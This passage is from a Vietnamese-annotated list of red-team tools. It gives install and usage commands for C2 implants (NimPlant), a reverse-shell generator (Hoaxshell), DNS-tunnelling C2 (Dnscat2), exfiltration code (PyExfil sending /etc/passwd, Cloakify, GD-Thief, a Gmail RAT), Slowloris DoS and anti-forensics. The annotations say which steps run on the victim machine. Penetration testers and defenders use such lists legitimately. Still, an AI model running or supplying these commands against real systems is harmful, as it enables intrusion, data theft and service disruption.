- Encryption and compression of all traffic by default, obfuscates static strings in implant artefacts
- Support for several implant types, including native binaries (**exe/dll**), **shellcode** or self-deleting executables
- Easy deployment of more advanced functionality or **payloads** via `inline-execute`, `shinject` (using dynamic invocation), or in-thread `execute-assembly`
- Comprehensive logging of all interactions and file operations

**Install:**

```bash
curl https://nim-lang.org/choosenim/init.sh -sSf | sh
choosenim stable
git clone https://github.com/chvancooten/NimPlant
cd client
nimble install -d
pip3 install -r server/requirements.txt
apt install mingw-w64
```
**Lưu ý:** Các lệnh cài đặt ngôn ngữ lập trình **Nim** (**choosenim** là trình quản lý phiên bản Nim), clone mã nguồn **NimPlant**, cài đặt dependency Nim (`nimble`), cài đặt dependency **Python** cho server (`pip3`) và cài đặt **mingw-w64** để cross-compile binary **Windows** trên **Linux**. Đây là quá trình cài đặt teamserver/builder của **NimPlant** trên máy attacker.

**Cách sử dụng:**

```bash
# Generate payloads
python .\NimPlant.py compile all

# Start server
python .\NimPlant.py server
```
**Lưu ý:** Sử dụng **script Python NimPlant.py**. Lệnh `compile all` tạo các implant/payload khác nhau. Lệnh `server` khởi động teamserver. Bạn cần cấu hình kết nối giữa implant và teamserver, cũng như các chi tiết C2 khác.

Before running make sure to create the `config.tool` configuration file, more information can be found [tại đây](https://github.com/chvancooten/NimPlant#getting-started).
**Lưu ý:** Việc cấu hình rất quan trọng trước khi chạy **NimPlant**.

Full usage information can be found [tại đây](https://github.com/chvancooten/NimPlant#usage).

[Blog - Building a C2 Implant in Nim - Considerations and Lessons Learned](https://casvancooten.com/posts/2021/08/building-a-c2-implant-in-nim-considerations-and-lessons-learned/)

![image](https://user-images.githubusercontent.com/100603074/220959859-d930b110-c774-4b4c-b004-e4a85a6214ba.png)

*Image used from https://casvancooten.com*

### [🔙](#tool-list)[**Hoaxshell**](https://github.com/t3l3machus/hoaxshell)

A **Windows reverse shell payload** generator and handler that abuses the http(s) protocol to establish a **beacon-like reverse shell**.
**Lưu ý:** **Hoaxshell** tạo một **reverse shell** hoạt động giống **beacon** (kết nối định kỳ về attacker) qua HTTP/S. Nó tránh sử dụng các kênh liên lạc shell trực tiếp thường bị giám sát chặt chẽ hơn.

**Install:**

```bash
git clone https://github.com/t3l3machus/hoaxshell
cd ./hoaxshell
sudo pip3 install -r requirements.txt
chmod +x hoaxshell.py
```
**Lưu ý:** Tải mã nguồn, cài dependency Python và cấp quyền thực thi cho **script Python**. Chạy trên hệ thống **Linux** (máy attacker).

**Cách sử dụng:**

```bash
# Payload that utilizes Invoke-Expression (default)
sudo python3 hoaxshell.py -s <your_ip>

# Payload that writes and executes commands from a file
sudo python3 hoaxshell.py -s <your_ip> -x "C:\Users\\\$env:USERNAME\.local\hack.ps1"

# Encrypted shell session with a trusted certificate
sudo python3 hoaxshell.py -s <your.domain.com> -t -c </path/to/cert.pem> -k <path/to/key.pem>
```
**Lưu ý:** Chạy **script Python hoaxshell.py** trên máy attacker. `-s` là địa chỉ IP hoặc domain của attacker mà shell sẽ kết nối về. `-x` chỉ định một đường dẫn file trên máy nạn nhân để ghi lệnh vào trước khi thực thi (kỹ thuật "drop and run"). `-t` bật **TLS/HTTPS** và cần chỉ định file certificate (`-c`) và private key (`-k`). Output của **Hoaxshell** là payload **PowerShell** cần chạy trên máy **Windows** nạn nhân.

Full usage documentation [tại đây](https://github.com/t3l3machus/hoaxshell#usage).

[Usage Demo - YouTube](https://www.youtube.com/watch?v=SEufgD5UxdU)

[**Hoaxshell** vs AV](https://github.com/t3l3machus/hoaxshell#av-bypass-pocs)

![image](https://user-images.githubusercontent.com/100603074/229649767-817d838c-891d-4a33-b494-9249f3a2f404.png)

*Image used from https://github.com/t3l3machus/hoaxshell*

**Exfiltration**
====================

### [🔙](#tool-list)[**Dnscat2**](https://github.com/iagox86/dnscat2)

A tool for establishing **C2 connections** via DNS, even if the attacker and victim machines are behind a firewall / network address translation (**NAT**).

The tool is designed to be stealthy and difficult to detect, as it uses legitimate **DNS traffic** to transmit data.

**Install (Compile - Server):**

```bash
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
gem install bundler
bundle install
```
**Lưu ý:** Cài đặt **Dnscat2 Server**. Clone mã nguồn (công cụ được viết bằng **Ruby**), di chuyển vào thư mục server và cài đặt các gem **Ruby** cần thiết bằng **bundler**. Yêu cầu môi trường **Ruby** và **Bundler**. Chạy trên máy attacker.

**Install (Compile - Client):**

```bash
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/client/
make
```
**Lưu ý:** Biên dịch client **Dnscat2**. Client được viết bằng **C**.

Full installation information can be found in the [Installation Section](https://github.com/iagox86/dnscat2#compiling).

**Cách sử dụng (Server):**

```bash
# Establish the server
ruby ./dnscat2.rb DOMAIN.COM
```
**Lưu ý:** Chạy **Dnscat2 Server** với tên miền sẽ được sử dụng cho **DNS tunneling** (`DOMAIN.COM`). Cần cấu hình bản ghi NS của `DOMAIN.COM` để trỏ đến IP của **Dnscat2 Server** hoặc dùng tùy chọn `--no-canary` nếu không có tên miền tùy chỉnh.

**Cách sử dụng (Client):**

```bash
# Establish the client with authoritative domain
./dnscat2 DOMAIN.COM

# Establish the client without authoritative domain
./dnscat2 --dns host=0.0.0.0,port=0000

# Ping the server from the client
./dnscat --ping DOMAIN.COM

# Ping the server from the client, with custom dns resolver ip
./dnscat --dns server=0.0.0.0,domain=DOMAIN.COM --ping
```
**Lưu ý:** Chạy client **Dnscat2** trên máy nạn nhân. Nó sẽ cố gắng kết nối đến server thông qua các truy vấn **DNS** qua **resolver** mặc định hoặc tùy chỉnh. Kỹ thuật **DNS tunneling** ẩn dữ liệu trong các bản ghi DNS.

**Cách sử dụng (Tunnels):**

```bash
# (After establishing the client) You can open a new tunnelled port
listen [lhost:]lport rhost:rport

# Forward ssh connections through the dnscat2 client to an internal device
listen 127.0.0.1:2222 10.10.10.10:22
```
**Lưu ý:** Các lệnh này được sử dụng bên trong phiên shell **Dnscat2**. Nó cho phép thiết lập các tunnel TCP hoặc UDP qua **kênh C2 DNS**. Lệnh `listen` thiết lập một listener cục bộ trên máy attacker và chuyển tiếp lưu lượng qua tunnel đến địa chỉ IP và cổng bên trong mạng nạn nhân.

Full usage information can be found in the [Usage Section](https://github.com/iagox86/dnscat2#usage).

![image](https://user-images.githubusercontent.com/100603074/210116521-0ef905ec-cc14-4cdc-9831-46bbded8c6af.png)

### [🔙](#tool-list)[**Cloakify**](https://github.com/TryCatchHCF/Cloakify)

When **exfiltrating victim files**, DLP (Data Loss Prevention) solutions will typically trigger on strings within these files. **Cloakify** reduces this risk by transforming the data.

**Cloakify** transforms any filetype (e.g. **.zip, .exe, .xls**, etc.) into a list of harmless-looking strings. This lets you hide the file in plain sight, and transfer the file without triggering alerts.

**Note:** You can make your own ciphers, see [tại đây](https://github.com/TryCatchHCF/Cloakify#create-your-own-cipers) for more info.

**Install:**

```bash
git clone https://github.com/TryCatchHCF/Cloakify
```
**Lưu ý:** Tải mã nguồn bằng **Git**.

**Cách sử dụng:**

```bash
# Cloakify some text
python3 cloakify.py TEXT.txt ciphers/desserts.ciph > TEXT.cloaked

# De-Cloakify the text
python3 decloakify.py TEXT.cloaked ciphers/desserts.ciph
```
**Lưu ý:** Các ví dụ sử dụng **script Python cloakify.py** và **decloakify.py**. Bạn cung cấp file input (`TEXT.txt`), một file "cipher" (`ciphers/desserts.ciph` chứa danh sách các chuỗi sẽ dùng để mã hóa dữ liệu) và công cụ sẽ output ra file chứa dữ liệu đã bị **cloakified** (`TEXT.cloaked`). Để giải mã, bạn sử dụng **decloakify.py** với file **cloakified** và file cipher tương ứng. File cipher chứa một danh sách các chuỗi "vô hại" như tên món tráng miệng, tên bài hát, dòng thơ,...

![image](https://user-images.githubusercontent.com/100603074/210117067-4611a42a-2ac7-44af-8aee-2e448c05909b.png)

![image](https://user-images.githubusercontent.com/100603074/210116996-8ec36a12-8eef-44e9-924a-ad179e599910.png)

### [🔙](#tool-list)[**PyExfil**](https://github.com/ytisf/PyExfil)

"An Alpha-Alpha stage package, not yet tested (and will appreciate any feedbacks and commits) designed to show several techniques of data exfiltration is real-world scenarios."
**Lưu ý:** Đây là một **package Python** thể hiện nhiều kỹ thuật **data exfiltration** khác nhau. Tự nhận là đang ở giai đoạn phát triển ban đầu (Alpha-Alpha stage).

**Install:**

```bash
git clone https://www.github.com/ytisf/PyExfil;cd PyExfil;pip install -r requirements.txt;pip install py2exe;pip setup.py install
```
**Lưu ý:** Tải mã nguồn, cài đặt các thư viện Python cần thiết và sử dụng **`setup.py install`** để cài đặt package. **`pip install py2exe`** có thể dùng để tạo file thực thi cho Windows.

**Cách sử dụng:** (Full Usage [tại đây](https://github.com/ytisf/PyExfil/blob/master/USAGE.md))

#### HTTP Cookies

```python
from pyexfil.network.HTTP_Cookies.http_exfiltration import send_file, listen

# For Client (exfil)
send_file(addr='http://www.morirt.com', file_path=FILE_TO_EXFIL)

# For Server (collecting)
listen(local_addr='127.0.0.1', local_port=80)
```
**Lưu ý:** Ví dụ sử dụng **PyExfil** để **exfiltrate** dữ liệu bằng cách nhúng chúng vào **cookie HTTP**. Bạn cần chạy **listener** trên máy attacker và sử dụng **send_file** trên máy nạn nhân.

#### ICMP Echo 8

```python
from pyexfil.network.ICMP.icmp_exfiltration import send_file, init_listener

# For Client (exfil)
ip_addr = "127.0.0.1"
send_file(ip_addr, src_ip_addr="127.0.0.1", file_path="", max_packetsize=512, SLEEP=0.1)

# For Server (collecting)
init_listener(ip_addr, saving_location="/tmp/")
```
**Lưu ý:** Ví dụ sử dụng **PyExfil** để **exfiltrate** dữ liệu bằng cách nhúng chúng vào gói tin **ICMP Echo** (gói tin **ping**). Yêu cầu quyền raw socket hoặc quyền admin trên máy gửi và nhận để tạo/lắng nghe gói ICMP.

#### NTP Request

```python
from pyexfil.network.NTP.ntp_exfil import exfiltrate, ntp_listen, NTP_UDP_PORT

# For Client (exfil)
ip_addr = "127.0.0.1"
exfiltrate("/etc/passwd", ip_addr, time_delay=0.1)

# For Server (collecting)
ntp_listener(ip="0.0.0.0", port=NTP_UDP_PORT)
```
**Lưu ý:** Ví dụ sử dụng **PyExfil** để **exfiltrate** dữ liệu bằng cách nhúng chúng vào gói tin **NTP** (Network Time Protocol).

![image](https://user-images.githubusercontent.com/100603074/206573575-e90384c4-4a39-4f3c-96ec-face1f191808.png)

### [🔙](#tool-list)[**Powershell RAT**](https://github.com/Viralmaniar/Powershell-RAT)

**Python based backdoor** that uses **Gmail** to **exfiltrate** data as an e-mail attachment. It tracks the user activity using screen capture and sends the information to an attacker as an e-mail attachment.
**Lưu ý:** **Powershell RAT** thực tế bao gồm cả mã nguồn **Python** (server hoặc điều khiển) và mã nguồn **PowerShell** (backdoor/agent chạy trên máy nạn nhân). Nó sử dụng Gmail làm kênh **exfiltration** bằng cách gửi email đính kèm dữ liệu thu thập được.

**Install:**

```bash
git clone https://github.com/Viralmaniar/Powershell-RAT
```
**Lưu ý:** Tải mã nguồn bằng **Git**.

**Cách sử dụng:** (Full Usage [tại đây](https://github.com/Viralmaniar/Powershell-RAT/blob/master/README.md))

#### Setup

- Throwaway Gmail address
- Enable "**Allow less secure apps**" by going to https://myaccount.google.com/lesssecureapps
- Modify the `$username` & `$password` variables for your account in the Mail.ps1 Powershell file
- Modify `$msg.From` & `$msg.To.Add` with throwaway gmail address
**Lưu ý:** Để backdoor **PowerShell** này hoạt động, bạn cần thiết lập một tài khoản Gmail và cấu hình backdoor với thông tin đăng nhập (tên người dùng và mật khẩu) của tài khoản Gmail đó để nó có thể gửi email. "Allow less secure apps" cần bật để backdoor có thể đăng nhập vào Gmail bằng mật khẩu đơn thuần thay vì OAuth/MFA. *Cẩn thận khi sử dụng tài khoản Gmail cho mục đích này.*

![image](https://user-images.githubusercontent.com/100603074/210267906-68a2e852-d7b5-4b61-a747-77844e1d7d99.png)

### [🔙](#tool-list)[**GD-Thief**](https://github.com/antman1p/GD-Thief)

Tool for **exfiltrating** files from a target's **Google Drive** that you have access to, via Google's API.

This includes all shared files, all files from shared drives, and all files from domain drives that the target has access to.
**Lưu ý:** Công cụ này tập trung vào việc thu thập dữ liệu từ **Google Drive**, lợi dụng quyền truy cập tài khoản Google đã bị xâm nhập hoặc quyền truy cập ứng dụng đối với tài khoản đó.

**Install:**

```bash
git clone https://github.com/antman1p/GD-Thief.git
cd GD-Thief
pip install --upgrade google-api-python-client google-auth-httplib2 google-auth-oauthlib
```
**Lưu ý:** Tải mã nguồn và cài đặt các thư viện **Python** cho việc tương tác với Google API.

then...

1. Create a new Google Cloud Platform (GCP) project
2. Enable a **Google Workspace API**
3. Configure **OAuth Consent** screen
4. Create a credential
5. Add the victim's Google account to the Application's Test Users

For detailed setup instructions see the [How To Guide](https://github.com/antman1p/GD-Thief#how-to).
**Lưu ý:** Các bước thiết lập bên ngoài, cấu hình một dự án Google Cloud Platform và OAuth 2.0 để công cụ có thể được ủy quyền truy cập dữ liệu Google Drive. Quá trình này phức tạp và yêu cầu quyền truy cập vào cả tài khoản GCP của attacker và (ban đầu) sự đồng ý hoặc quyền của nạn nhân.

**Cách sử dụng:**

```bash
usage:
python3 gd_thief.py [-h] -m [{dlAll, dlDict[-d <DICTIONARY FILE PATH>]}
	[-t <THREAD COUNT>]

help:

This Module will connect to Google's API using an access token and exfiltrate files
from a target's **Google Drive**. It will output exfiltrated files to the ./loot directory

arguments:
        -m [{dlAll, dlDict}],
                --mode [{dlAll, dlDict}]
                Chế độ tải xuống file
                Có thể là "dlAll", "dlDict [-d <DICTIONARY FILE PATH>]", hoặc... (Thêm tùy chọn sẽ đến)

optional arguments:
        -d <DICTIONARY FILE PATH>, --dict <DICTIONARY FILE PATH>
                        Đường dẫn đến file dictionary. Bắt buộc với chế độ tải xuống "-m, --mode dlDict"
                        Bạn có thể sử dụng dictionary được cung cấp, ví dụ: "-d ./dictionaries/secrets-keywords.txt"
        -t <THREAD COUNT>, --threads <THREAD COUNT>
                        Số luồng. (Quá nhiều có thể vượt quá giới hạn tốc độ của Google)

        -h, --help
                Hiển thị thông báo trợ giúp và thoát
```
**Lưu ý:** Hướng dẫn sử dụng **script Python gd_thief.py**. Công cụ sử dụng các mode khác nhau để **exfiltrate**. `dlAll` tải xuống tất cả các file mà tài khoản có quyền truy cập. `dlDict` tải xuống các file có tên hoặc nội dung khớp với các từ khóa trong file dictionary. Cần có **token truy cập Google API** để sử dụng công cụ này.

Nice [blog post](https://antman1p-30185.medium.com/youre-a-gd-thief-1e02358fd557) explaining the logic behind the tool.

**Impact**
====================

### [🔙](#tool-list)Rò rỉ hướng dẫn pentester của **Conti**

**Conti** is a ransomware group that is known for targeting large organizations and using sophisticated tactics to evade detection and maximize the impact of their attacks.

**Conti** has been responsible for a number of high-profile ransomware attacks, including ones against the computer systems of the City of Pensacola, Florida, and the computer systems of the Irish health service.

The [**Conti Pentester Guide Leak - Repository**](https://github.com/ForbiddenProgrammer/conti-pentester-guide-leak) contains leaked pentesting materials given to **Conti ransomware group affiliates**.
**Lưu ý:** Repository này không phải là một **công cụ** trực tiếp mà là một tập hợp tài liệu (đã bị rò rỉ) mô tả các TTP (**Tactics, Techniques, and Procedures**) và **công cụ** được sử dụng bởi các **affiliate** (chi nhánh) của băng nhóm **ransomware Conti**. Rất hữu ích cho mục đích tình báo về mối đe dọa và phòng thủ.

Topics include:

- Configuring **Rclone** with **MEGA** for **data exfiltration**
- Configuring **AnyDesk** as **persistence** and remote access into a victim’s network
- Elevating and gaining admin rights inside a company’s hacked network
- Taking over **domain controller**s
- Dumping passwords from **Active Directory**
**Lưu ý:** Danh sách các chủ đề quan trọng trong tài liệu rò rỉ, bao gồm các kỹ thuật **exfiltration**, duy trì truy cập (**persistence**), nâng quyền, kiểm soát **domain controller** và thu thập thông tin xác thực.

**Note:** *[vx-underground.org](https://www.vx-underground.org/) obtained more training materials and tools used by **Conti ransomware** operators [tại đây](https://share.vx-underground.org/Conti/).*

![image](https://user-images.githubusercontent.com/100603074/210856582-44a9bf16-23d4-4b7e-9e91-8604c3191e78.png)

*Image used from https://github.com/ForbiddenProgrammer/conti-pentester-guide-leak*

### [🔙](#tool-list)[**SlowLoris**](https://github.com/gkbrk/slowloris)

**Slowloris** is a type of denial-of-service (DoS) attack that involves sending HTTP requests to a web server in a way that ties up the server's resources, preventing it from being able to process legitimate requests.

This attack would typically be conducted with a **botnet**, it is designed to be difficult to detect and mitigate, as it uses a relatively small number of connections and does not generate a large amount of traffic.
**Lưu ý:** Kỹ thuật tấn công DoS **Slowloris** không cố gắng làm ngập server bằng lưu lượng lớn, mà bằng cách duy trì nhiều kết nối HTTP đến server càng lâu càng tốt, khiến server không có đủ tài nguyên để phục vụ các kết nối hợp pháp.

**Install (Pip):**

```bash
sudo pip3 install slowloris
```
**Lưu ý:** Cài đặt **công cụ Slowloris** bằng pip.

**Install (Git):**

```bash
git clone https://github.com/gkbrk/slowloris.git
cd slowloris
```
**Lưu ý:** Tải mã nguồn.

**Cách sử dụng:**

```bash
# Pip
slowloris example.com

# Git
python3 slowloris.py example.com
```
**Lưu ý:** Sử dụng công cụ để thực hiện tấn công DoS vào tên miền mục tiêu (`example.com`). Bạn cần thay `example.com` bằng mục tiêu thực tế.

![image](https://user-images.githubusercontent.com/100603074/210115630-b6541ee0-ad82-471a-9a7e-7f0ec028c67d.png)

### [🔙](#tool-list)[**usbkill**](https://github.com/hephaest0s/usbkill)

This is an **anti-forensic kill-switch** that waits for a change in USB port status, immediately shutting down endpoint if a change is detected.

In some situations, it is imperative that no data is added or removed from an endpoint via USB.

This is where **USBkill** comes in.
**Lưu ý:** **USBkill** là một **công cụ chống pháp y** tự động kích hoạt (thường là tắt máy ngay lập tức) khi có sự thay đổi trên cổng **USB** (ví dụ: cắm hoặc rút thiết bị USB). Điều này nhằm ngăn chặn dữ liệu bị sao chép ra ngoài hoặc bị đưa vào bằng thiết bị USB trong trường hợp khẩn cấp.

**Install:**

```
git clone https://github.com/hephaest0s/usbkill
cd usbkill
./setup.py install
```
**Lưu ý:** Tải mã nguồn và cài đặt **công cụ Python** bằng **`setup.py`**. Yêu cầu cài đặt **Python** và **Git**.

**Cách sử dụng:**

```bash
sudo python3 usbkill.py
```
**Lưu ý:** Chạy **script Python usbkill.py** với quyền **super user** (`sudo`) vì nó cần quyền truy cập vào trạng thái của cổng **USB**.

![image](https://user-images.githubusercontent.com/100603074/217654429-98efef6d-b70f-48b8-8979-228ce2f78932.png)

*Image used from https://en.wikipedia.org/wiki/USBKill*

### [🔙](#tool-list)[**Keytap**](https://github.com/ggerganov/kbd-audio)

This is a tool that can guess the pressed keyboard keys from the audio of a computer's microphone.

**Keytap2** can also be used to retrieve text from audio snippets of keyboard typing.
**Lưu ý:** Công cụ này phân tích âm thanh tiếng gõ phím để đoán xem các phím nào đã được nhấn (side-channel attack). **Keytap2** có thể là phiên bản cải tiến hoặc phần liên quan.

**Install (Build):**

```
git clone https://github.com/ggerganov/kbd-audio
cd kbd-audio
git submodule update --init
mkdir build && cd build
cmake ..
make
```
**Lưu ý:** Clone mã nguồn và các submodule, tạo thư mục build, cấu hình dự án bằng **CMake** và biên dịch (`make`). Yêu cầu các công cụ build C/C++ (gcc, clang...) và **CMake**. Chạy trên **Linux/macOS/Windows**.

**Cách sử dụng:**

```bash
# Record audio to a raw binary file on disk
./record-full output.kbd [-cN]

# Playback a recording captured via the record-full tool
./play-full input.kbd [-pN]

# Record audio only while typing (Useful for collecting training data for keytap)
./record output.kbd [-cN] [-CN]
```
**Lưu ý:** `record-full` ghi âm thanh đầy đủ. `play-full` phát lại file âm thanh đã ghi. `record` chỉ ghi âm thanh khi phát hiện gõ phím, hữu ích để thu thập dữ liệu huấn luyện. Cờ `-c`/`-p` có thể liên quan đến kênh âm thanh hoặc thiết bị. Output là các file `.kbd` thô. Để phân tích, cần sử dụng các module khác của **Keytap** (không hiển thị ở đây) hoặc **Keytap2**.

See full usage documentation [tại đây](https://github.com/ggerganov/kbd-audio#tool-details).

Try the online demo at [https://keytap.ggerganov.com/](https://keytap.ggerganov.com/).

![image](https://user-images.githubusercontent.com/100603074/229649861-728e7ebb-ddb9-4347-9934-dd077d12bb41.png)

*Image used from https://github.com/ggerganov/kbd-audio*


